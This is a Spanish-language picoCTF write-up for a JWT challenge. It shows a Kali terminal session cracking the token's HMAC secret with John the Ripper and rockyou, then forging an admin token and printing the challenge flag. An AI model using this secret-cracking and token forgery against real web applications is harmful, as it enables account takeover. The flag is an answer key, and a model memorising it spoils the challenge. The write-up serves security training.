## Objetivo
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210
## Solución
- Entramos a la pagina, pusimos un usuario X, nos fuimos a las cookies, copiamos el token
- Lo enviamos a un archivo en la consola, lo descomprimimos
```bash
┌──(armando㉿kali)-[~]
└─$ nano bandera 

┌──(armando㉿kali)-[~]
└─$ cat bandera 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYXJtYW5kbyJ9.EtQ_h8KZbmTf5-SSJAdh0z9rvTM_VpFT62bHiRwC_Yk

┌──(armando㉿kali)-[~]
└─$ ls /usr/share/wordlists                 
amass      dnsmap.txt     john.lst    nmap.lst        wfuzz
dirb       fasttrack.txt  legion      rockyou.txt.gz  wifite.txt
dirbuster  fern-wifi      metasploit  sqlmap.txt
    
┌──(armando㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

┌──(armando㉿kali)-[~]
└─$ ls /usr/share/wordlists                      
amass      dnsmap.txt     john.lst    nmap.lst     wfuzz
dirb       fasttrack.txt  legion      rockyou.txt  wifite.txt
dirbuster  fern-wifi      metasploit  sqlmap.txt

┌──(armando㉿kali)-[~]
└─$ john bandera -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:04 DONE (2024-09-24 08:55) 0.2347g/s 1735Kp/s 1735Kc/s 1735KC/s ilovepinky53..ilovepets0
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
       
┌──(armando㉿kali)-[~]
└─$ 
```
- Entramos a la pagina JSON Web Tokens ahí colocamos el token que copiamos, lo modificamos poniéndole que somos el usuario y para la llave la palabra clave que nos salió y ya nos genera la bandera.
```bash
picoCTF{jawt_was_just_what_you_thought_44c752f5}
```

## Notas Adicionales
## Referencias
- [ JSON Web Tokens - jwt.io](https://jwt.io/)
